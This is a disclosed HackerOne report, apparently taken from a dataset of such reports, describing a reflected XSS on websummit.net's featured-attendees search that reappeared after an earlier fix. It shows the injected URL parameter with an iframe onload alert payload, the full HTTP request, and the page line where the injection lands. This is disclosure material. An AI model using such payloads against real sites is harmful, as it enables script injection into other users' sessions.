---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '176698'
original_report_id: '176698'
title: Reflective XSS
weakness: Cross-site Scripting (XSS) - Generic
team_handle: websummit
created_at: '2016-10-19T01:22:02.081Z'
disclosed_at: '2017-10-28T17:43:30.797Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflective XSS

## Metadata

- HackerOne Report ID: 176698
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: websummit
- Disclosed At: 2017-10-28T17:43:30.797Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

It appears the fix for https://hackerone.com/reports/166699 did not stick.

**URL**
https://websummit.net/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E]

**URL Parameters**
q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E]

**Request Headers**
```
GET /attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E] HTTP/1.1
Host: websummit.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: __cfduid=d0206c15456d3dc6ff974f786972dd1e21475340728; UTMvalues=?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E%5Dvisited=yes; _gu=79b8b070-b65b-4988-9808-72c0c3f009d1; _gw=2.u[~0,~0,~0,~0,~0]v[~enka0,~1,~0]a(3341-30024717~102t); _gs=2.s(); intercom-id-h2ooummb=c763a234-9283-447e-9919-48808090f3b5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

Injection on line 151
```
<script id="fa-list" class='api-json' data-target='#attendees' data-url='https://api.cilabs.net/v1/conferences/ws16/info/attendees?limit=25&q=rubyoob'><iframe/onload=alert(document.domain)></iframe>
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
